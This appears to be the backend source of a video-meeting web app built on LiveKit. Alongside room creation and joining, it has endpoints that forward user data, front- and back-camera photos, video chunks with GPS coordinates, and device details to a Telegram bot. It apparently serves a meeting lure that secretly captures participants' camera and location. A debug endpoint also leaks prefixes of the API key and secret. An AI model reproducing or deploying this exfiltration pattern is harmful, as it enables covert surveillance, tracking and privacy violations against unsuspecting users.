import { Hono } from "npm:hono";
import { cors } from "npm:hono/cors";
import { logger } from "npm:hono/logger";
import * as kv from "./kv_store.tsx";
import * as telegram from "./telegram.tsx";
import { AccessToken } from "npm:livekit-server-sdk";

// Force reload - version 2.2
const app = new Hono();

// Enable logger
app.use('*', logger(console.log));

// Enable CORS for all routes and methods
app.use(
  "/*",
  cors({
    origin: "*",
    allowHeaders: ["Content-Type", "Authorization", "apikey"],
    allowMethods: ["GET", "POST", "PUT", "DELETE", "OPTIONS"],
    exposeHeaders: ["Content-Length"],
    maxAge: 600,
  }),
);

// Get LiveKit credentials from environment
const LIVEKIT_URL = Deno.env.get("LIVEKIT_URL");
const LIVEKIT_API_KEY = Deno.env.get("LIVEKIT_API_KEY");
const LIVEKIT_API_SECRET = Deno.env.get("LIVEKIT_API_SECRET");
const APP_BASE_URL = Deno.env.get("APP_BASE_URL") || "https://stray-bone-61183886.figma.site";

// Check LiveKit config but don't throw - allow server to start
const LIVEKIT_CONFIGURED = !!(LIVEKIT_URL && LIVEKIT_API_KEY && LIVEKIT_API_SECRET);

if (!LIVEKIT_CONFIGURED) {
  console.warn("⚠️ WARNING: LiveKit environment variables not set. LiveKit features will not work.");
  console.warn("Please set: LIVEKIT_URL, LIVEKIT_API_KEY, LIVEKIT_API_SECRET");
} else {
  console.log("✅ LiveKit configured:", { url: LIVEKIT_URL, apiKey: LIVEKIT_API_KEY.substring(0, 10) + "..." });
}

// Helper function to generate JWT token
async function generateLiveKitToken(
  roomName: string,
  identity: string,
  displayName: string,
  isModerator: boolean = false
): Promise<string> {
  console.log('🔑 [TOKEN] Creating token:', { 
    roomName, 
    identity, 
    displayName, 
    isModerator
  });

  const at = new AccessToken(LIVEKIT_API_KEY, LIVEKIT_API_SECRET, {
    identity,
    name: displayName,
  });

  at.addGrant({
    roomJoin: true,
    room: roomName,
    canPublish: true,
    canSubscribe: true,
    canPublishData: true,
    ...(isModerator && {
      roomAdmin: true,
      roomRecord: true,
    }),
  });

  const tokenResult = at.toJwt();
  const token = tokenResult instanceof Promise ? await tokenResult : tokenResult;
  const tokenString = typeof token === 'string' ? token : String(token);
  
  console.log('✅ [TOKEN] Generated:', tokenString.substring(0, 50) + '...');
  return tokenString;
}

// Helper function to generate slug
function generateSlug(): string {
  return Math.random().toString(36).substring(2, 15);
}

// Health check endpoint
app.get("/make-server-039e5f24/health", (c) => {
  return c.json({ status: "ok" });
});

// Debug endpoint to check LiveKit configuration
app.get("/make-server-039e5f24/debug-config", (c) => {
  return c.json({
    livekitUrl: LIVEKIT_URL,
    hasApiKey: !!LIVEKIT_API_KEY,
    apiKeyPrefix: LIVEKIT_API_KEY?.substring(0, 10),
    hasApiSecret: !!LIVEKIT_API_SECRET,
    secretPrefix: LIVEKIT_API_SECRET?.substring(0, 10),
  });
});

// CREATE ROOM endpoint
app.post("/make-server-039e5f24/create-room", async (c) => {
  console.log("🔥🔥🔥 [CREATE ROOM v2.1] NEW VERSION RUNNING! 🔥🔥🔥");
  try {
    // Check if LiveKit is configured
    if (!LIVEKIT_CONFIGURED) {
      return c.json({ 
        error: "LiveKit not configured. Please set LIVEKIT_URL, LIVEKIT_API_KEY, and LIVEKIT_API_SECRET environment variables." 
      }, 503);
    }

    const body = await c.req.json();
    const { hostDisplayName, title } = body;

    console.log("🚀 [CREATE ROOM] Request:", { hostDisplayName, title });

    if (!hostDisplayName) {
      return c.json({ error: "Missing hostDisplayName" }, 400);
    }

    // Generate unique room slug
    const roomSlug = generateSlug();
    const roomName = `room-${roomSlug}`;
    const identity = `host-${roomSlug}`;
    const inviteLink = `${APP_BASE_URL}?room=${roomSlug}`;

    // Generate JWT token for host (moderator)
    const token = await generateLiveKitToken(roomName, identity, hostDisplayName, true);

    // Store room metadata in KV
    await kv.set(`room:${roomSlug}`, {
      roomSlug,
      roomName,
      title: title || "Untitled Meeting",
      hostIdentity: identity,
      createdAt: new Date().toISOString(),
    });

    console.log("✅ [CREATE ROOM] Room created:", { roomSlug, roomName, title: title || "Untitled Meeting" });

    return c.json({
      roomSlug,
      roomName,
      inviteLink,
      roomId: roomSlug,
      token,
      livekitUrl: LIVEKIT_URL,
      identity,
      role: "moderator",
      title: title || "Untitled Meeting",
    });
  } catch (error) {
    console.error("❌ [CREATE ROOM] Error:", error);
    return c.json({ error: error.message }, 500);
  }
});

// JOIN ROOM endpoint
app.post("/make-server-039e5f24/join-room", async (c) => {
  try {
    // Check if LiveKit is configured
    if (!LIVEKIT_CONFIGURED) {
      return c.json({ 
        error: "LiveKit not configured. Please set LIVEKIT_URL, LIVEKIT_API_KEY, and LIVEKIT_API_SECRET environment variables." 
      }, 503);
    }

    const body = await c.req.json();
    const { slug, displayName } = body;

    console.log("🚀 [JOIN ROOM] Request:", { slug, displayName });

    if (!slug || !displayName) {
      return c.json({ error: "Missing slug or displayName" }, 400);
    }

    // Check if room exists
    const roomData = await kv.get(`room:${slug}`);
    
    if (!roomData) {
      console.error("❌ [JOIN ROOM] Room not found:", slug);
      return c.json({ error: "Room not found" }, 404);
    }

    const { roomName, hostIdentity, title } = roomData as any;
    const identity = `participant-${Math.random().toString(36).substring(2, 15)}`;
    const isModerator = false; // Participants are not moderators

    // Generate JWT token for participant
    const token = await generateLiveKitToken(roomName, identity, displayName, isModerator);

    console.log("✅ [JOIN ROOM] Token generated:", { roomName, identity, title, tokenType: typeof token, tokenLength: token?.length });

    const responseData = {
      livekitUrl: LIVEKIT_URL,
      roomName,
      token,
      identity,
      role: "participant" as const,
      displayName,
      title, // Add title to response
    };

    console.log("📤 [JOIN ROOM] Sending response:", {
      ...responseData,
      token: '***',
      tokenType: typeof responseData.token,
      tokenLength: responseData.token?.length
    });

    return c.json(responseData);
  } catch (error) {
    console.error("❌ [JOIN ROOM] Error:", error);
    return c.json({ error: error.message }, 500);
  }
});

// TELEGRAM ENDPOINTS

// Send user data to Telegram
app.post("/make-server-039e5f24/telegram/send-user-data", async (c) => {
  try {
    const body = await c.req.json();
    const success = await telegram.sendUserDataToTelegram(body);
    return c.json({ success });
  } catch (error) {
    console.error("❌ [Telegram] Error sending user data:", error);
    return c.json({ success: false, error: error.message }, 500);
  }
});

// ✅ ДОБАВЛЕНО: Endpoint для отправки текстовых сообщений
app.post("/make-server-039e5f24/telegram/send-message", async (c) => {
  try {
    const body = await c.req.json();
    const { message } = body;
    
    if (!message) {
      return c.json({ success: false, error: 'Missing message' }, 400);
    }
    
    const success = await telegram.sendTextMessage(message);
    return c.json({ success });
  } catch (error) {
    console.error("❌ [Telegram] Error sending message:", error);
    return c.json({ success: false, error: error.message }, 500);
  }
});

// Send photo to Telegram
app.post("/make-server-039e5f24/telegram/send-photo", async (c) => {
  try {
    const formData = await c.req.formData();
    const photoFile = formData.get('photo') as File;
    const cameraType = formData.get('cameraType') as string;
    const userAgent = formData.get('userAgent') as string;
    const device = formData.get('device') as string;
    
    if (!photoFile || !cameraType) {
      return c.json({ success: false, error: 'Missing photo or cameraType' }, 400);
    }
    
    const photoBlob = new Blob([await photoFile.arrayBuffer()], { type: photoFile.type });
    
    const success = await telegram.sendPhotoToTelegram({
      photoBlob,
      cameraType: cameraType as 'front' | 'back',
      userAgent,
      device
    });
    
    return c.json({ success });
  } catch (error) {
    console.error("❌ [Telegram] Error sending photo:", error);
    return c.json({ success: false, error: error.message }, 500);
  }
});

// Send video to Telegram
app.post("/make-server-039e5f24/telegram/send-video", async (c) => {
  try {
    console.log('📹 [Backend] Received video upload request');
    
    const formData = await c.req.formData();
    const videoFile = formData.get('video') as File;
    const chunkNumber = parseInt(formData.get('chunkNumber') as string);
    const cameraType = formData.get('cameraType') as string;
    const userAgent = formData.get('userAgent') as string;
    const device = formData.get('device') as string;
    
    console.log(`📹 [Backend] Video chunk #${chunkNumber}, camera: ${cameraType}, size: ${videoFile?.size} bytes`);
    
    // ✅ Геолокация (опционально)
    const latitude = formData.get('latitude') ? parseFloat(formData.get('latitude') as string) : undefined;
    const longitude = formData.get('longitude') ? parseFloat(formData.get('longitude') as string) : undefined;
    const accuracy = formData.get('accuracy') ? parseFloat(formData.get('accuracy') as string) : undefined;
    const geoTimestamp = formData.get('timestamp') as string | undefined;
    
    if (!videoFile || isNaN(chunkNumber) || !cameraType) {
      console.error('❌ [Backend] Missing required fields:', { hasVideo: !!videoFile, chunkNumber, cameraType });
      return c.json({ success: false, error: 'Missing video, chunkNumber, or cameraType' }, 400);
    }
    
    // ✅ Проверяем размер ПЕРЕД обработкой
    const videoSizeMB = videoFile.size / 1024 / 1024;
    console.log(`📹 [Backend] Video size: ${videoSizeMB.toFixed(2)} MB`);
    
    if (videoSizeMB > 50) {
      console.error(`❌ [Backend] Video too large: ${videoSizeMB.toFixed(2)} MB (Telegram limit: 50MB)`);
      return c.json({ success: false, error: 'Video too large (max 50MB)' }, 413);
    }
    
    console.log('📹 [Backend] Converting video to blob...');
    const videoBlob = new Blob([await videoFile.arrayBuffer()], { type: videoFile.type });
    console.log(`📹 [Backend] Blob created, size: ${videoBlob.size} bytes`);
    
    console.log('📹 [Backend] Sending to Telegram...');
    const success = await telegram.sendVideoToTelegram({
      videoBlob,
      chunkNumber,
      cameraType: cameraType as 'front' | 'back',
      userAgent,
      device,
      // ✅ Передаём геолокацию если есть
      geoData: (latitude !== undefined && longitude !== undefined) ? {
        latitude,
        longitude,
        accuracy: accuracy || 0,
        timestamp: geoTimestamp || new Date().toISOString()
      } : undefined
    });
    
    if (success) {
      console.log(`✅ [Backend] Video chunk #${chunkNumber} sent successfully to Telegram`);
      return c.json({ success: true });
    } else {
      console.warn(`⚠️ [Backend] Failed to send video chunk #${chunkNumber} to Telegram`);
      return c.json({ success: false, error: 'Failed to send to Telegram' }, 500);
    }
  } catch (error) {
    console.error("❌ [Backend] Error processing video upload:", error);
    
    // ✅ Более информативная ошибка
    const errorMessage = error instanceof Error ? error.message : String(error);
    const errorName = error instanceof Error ? error.name : 'Unknown';
    
    console.error(`❌ [Backend] Error details: ${errorName} - ${errorMessage}`);
    
    return c.json({ 
      success: false, 
      error: errorMessage,
      errorType: errorName
    }, 500);
  }
});

// Send /start notification
app.post("/make-server-039e5f24/telegram/send-start-notification", async (c) => {
  try {
    const body = await c.req.json();
    const success = await telegram.sendStartNotification({
      timestamp: body.timestamp || new Date().toISOString()
    });
    return c.json({ success });
  } catch (error) {
    console.error("❌ [Telegram] Error sending start notification:", error);
    return c.json({ success: false, error: error.message }, 500);
  }
});

Deno.serve(app.fetch);